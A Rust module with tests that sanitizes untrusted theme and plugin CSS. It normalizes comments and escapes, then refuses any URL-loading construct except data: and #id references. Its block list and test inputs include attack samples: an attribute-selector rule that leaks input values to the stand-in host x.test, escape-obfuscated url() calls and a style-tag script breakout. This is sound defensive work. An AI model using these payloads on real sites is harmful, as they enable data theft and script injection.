//! Checks for CSS that comes from outside the app (theme files, plugin
//! stylesheets): nothing in it may load a resource from elsewhere.
//!
//! A stylesheet that can load `https://…` can send data out (attribute
//! selectors + background images) even from a plugin without the `network`
//! permission, so every way CSS can name a URL is refused, after undoing
//! comments and CSS escapes (`u\72l(`, `\75 rl(`), which a plain text search
//! would miss. `url(data:…)` and `url(#id)` (SVG references) are allowed.

/// Comments removed, escapes decoded, lowercased: what the CSS engine sees.
pub fn normalize(css: &str) -> String {
    let chars: Vec<char> = css.chars().collect();
    let mut out = String::with_capacity(css.len());
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        if c == '/' && chars.get(i + 1) == Some(&'*') {
            // Comments vanish (an unclosed one runs to the end, as in CSS).
            i += 2;
            while i < chars.len() && !(chars[i] == '*' && chars.get(i + 1) == Some(&'/')) {
                i += 1;
            }
            i += 2;
            continue;
        }
        if c == '\\' {
            let mut hex = String::new();
            let mut j = i + 1;
            while j < chars.len() && hex.len() < 6 && chars[j].is_ascii_hexdigit() {
                hex.push(chars[j]);
                j += 1;
            }
            if !hex.is_empty() {
                // One whitespace after a hex escape belongs to it.
                if j < chars.len() && chars[j].is_whitespace() {
                    j += 1;
                }
                let v = u32::from_str_radix(&hex, 16).unwrap_or(0xFFFD);
                out.push(char::from_u32(v).filter(|&c| c != '\0').unwrap_or('\u{FFFD}'));
                i = j;
                continue;
            }
            if let Some(&n) = chars.get(i + 1) {
                if n != '\n' {
                    out.push(n);
                }
                i += 2;
                continue;
            }
            i += 1;
            continue;
        }
        out.push(c);
        i += 1;
    }
    out.to_lowercase()
}

/// Functions and rules that take a URL (directly or as a string).
const URL_TAKERS: [&str; 6] = ["image-set(", "image(", "cross-fade(", "element(", "src(", "-webkit-image-set("];
const FORBIDDEN: [&str; 6] = ["@import", "@namespace", "</style", "expression(", "-moz-binding", "behavior:"];

/// Ok, or why the CSS was refused.
pub fn check(css: &str) -> Result<(), String> {
    let n = normalize(css);
    for f in FORBIDDEN {
        if n.contains(f) {
            return Err(format!("{f} isn't allowed"));
        }
    }
    for f in URL_TAKERS {
        if n.contains(f) {
            return Err(format!("{f}…) can load files from the internet and isn't allowed"));
        }
    }
    let mut rest = n.as_str();
    while let Some(p) = rest.find("url(") {
        let arg = rest[p + 4..].trim_start().trim_start_matches(['"', '\'']).trim_start();
        if !(arg.starts_with("data:") || arg.starts_with('#')) {
            return Err("url() may only use data: images".into());
        }
        rest = &rest[p + 4..];
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::check;

    #[test]
    fn plain_css_passes() {
        assert!(check(".a { color: red; background: linear-gradient(#000, #fff); }").is_ok());
        assert!(check(".a { background: url(data:image/png;base64,AAAA) }").is_ok());
        assert!(check(".a { background: url( \"data:image/svg+xml,<svg/>\" ) }").is_ok());
        assert!(check(".a { filter: url(#glow) }").is_ok());
    }

    #[test]
    fn every_way_to_name_a_url_is_refused() {
        for bad in [
            ".a{background:url(https://x.test/a.png)}",
            ".a{background:url(//x.test/a.png)}",
            ".a{background:url('http://x.test')}",
            ".a{background:u\\72l(https://x.test)}",
            ".a{background:\\75 rl(https://x.test)}",
            ".a{background:U\\RL(https://x.test)}",
            ".a{background:image-set(\"https://x.test/a.png\" 1x)}",
            ".a{background:-webkit-image-set(\"https://x.test/a.png\" 1x)}",
            ".a{background:image(\"https://x.test/a.png\")}",
            ".a{background:cross-fade(url(a), url(b))}",
            "@import 'https://x.test/a.css';",
            "@\\69mport 'https://x.test/a.css';",
            "@font-face{font-family:x;src:url(https://x.test/f.woff2)}",
            "input[value^=a]{background:url(https://x.test/?a)}",
            "</style><script>alert(1)</script>",
            ".a{background:url(data:x), url(https://x.test)}",
        ] {
            assert!(check(bad).is_err(), "accepted: {bad}");
        }
    }

    #[test]
    fn comments_cannot_hide_a_url() {
        assert!(check(".a{background:url(/**/https://x.test)}").is_err());
        assert!(check(".a{background:/* url(data:x) */url(https://x.test)}").is_err());
    }
}
